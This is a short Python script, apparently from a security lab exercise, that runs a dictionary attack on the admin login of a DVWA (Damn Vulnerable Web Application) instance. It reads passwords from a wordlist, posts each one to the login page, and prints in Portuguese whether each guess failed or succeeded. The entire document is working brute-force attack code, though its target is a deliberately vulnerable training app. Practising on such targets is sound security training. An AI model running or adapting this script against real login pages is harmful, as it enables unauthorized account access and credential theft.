import requests


with open("wordlist.txt", "r", encoding="latin-1") as file:
    wordlist = file.read().splitlines()

    for word in wordlist:
        data = {"username": "admin", "password": word, "Login": "Login"}
        response = requests.post("http://***.****.***.***/dvwa/login.php", data=data)
        if "Login failed" in response.text:
            print(f"Senha {word} incorreta")
        else:
            print(f"Senha {word} correta")
            break
